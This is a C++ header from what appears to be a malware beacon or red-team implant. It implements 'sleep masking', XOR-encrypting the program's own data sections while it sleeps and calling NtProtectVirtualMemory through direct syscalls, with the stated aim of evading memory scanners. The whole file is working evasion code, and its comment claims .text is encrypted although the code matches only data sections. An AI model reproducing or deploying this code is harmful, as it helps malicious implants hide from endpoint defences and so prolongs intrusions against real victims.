#pragma once
#include <windows.h>
#include "evasion.h"
#include "syscalls.h"

namespace anti {
namespace mem {

// Simple but effective sleep masking.
// Encrypts the beacon's memory sections while sleeping to evade memory scanners.
inline void sleep_mask(DWORD sleep_ms) {
    HMODULE hModule = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery((const void*)&sleep_mask, &mbi, sizeof(mbi))) {
        hModule = (HMODULE)mbi.AllocationBase;
    }
    if (!hModule) return;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    
    // Find the .text and .data sections to encrypt
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    // We'll use a random key for each sleep cycle
    uint8_t key = static_cast<uint8_t>(GetTickCount64() & 0xFF);
    if (key == 0) key = 0xBD;

    // 1. Encrypt sections
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Mask names to avoid static detection of section names
        char name[9] = {0};
        memcpy(name, sectionHeader[i].Name, 8);
        
        // Encrypt .text, .data, .rdata
        if (strstr(name, "data") || strstr(name, "rdata")) {
            BYTE* pSection = (BYTE*)hModule + sectionHeader[i].VirtualAddress;
            SIZE_T size = sectionHeader[i].Misc.VirtualSize;
            DWORD oldProtect;
            
            // Change to RW to encrypt
            if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), (void**)&pSection, &size, PAGE_READWRITE, &oldProtect) == 0) {
                xor_region(pSection, size, key);
                // Change back to original protect (usually RX or R)
                syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), (void**)&pSection, &size, oldProtect, &oldProtect);
            }
        }
    }

    // 2. Actual Sleep
    ::Sleep(sleep_ms);

    // 3. Decrypt sections
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        char name[9] = {0};
        memcpy(name, sectionHeader[i].Name, 8);
        
        if (strstr(name, "data") || strstr(name, "rdata")) {
            BYTE* pSection = (BYTE*)hModule + sectionHeader[i].VirtualAddress;
            SIZE_T size = sectionHeader[i].Misc.VirtualSize;
            DWORD oldProtect;
            
            if (syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), (void**)&pSection, &size, PAGE_READWRITE, &oldProtect) == 0) {
                xor_region(pSection, size, key);
                syscalls::SysNtProtectVirtualMemory(GetCurrentProcess(), (void**)&pSection, &size, oldProtect, &oldProtect);
            }
        }
    }
}

} // namespace mem
} // namespace anti
